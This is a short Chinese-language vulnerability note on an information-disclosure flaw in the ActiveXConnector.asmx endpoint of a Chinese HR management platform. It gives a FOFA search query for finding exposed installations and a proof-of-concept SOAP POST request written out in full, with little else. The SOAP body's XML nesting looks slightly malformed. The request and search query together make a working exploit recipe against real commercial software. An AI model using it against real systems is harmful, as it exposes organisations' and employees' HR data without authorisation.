同享人力管理管理平台ActiveXConnector.asmx信息泄露

fofa

body="/Assistant/Default.aspx"

poc

POST /Service/ActiveXConnector.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: text/xml;charset=UTF-8
Content-Length: 224

<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:header>
   <soapenv:body>
      <tem:getactivexconnector>
   </tem:getactivexconnector></soapenv:body>
</soapenv:header></soapenv:envelope>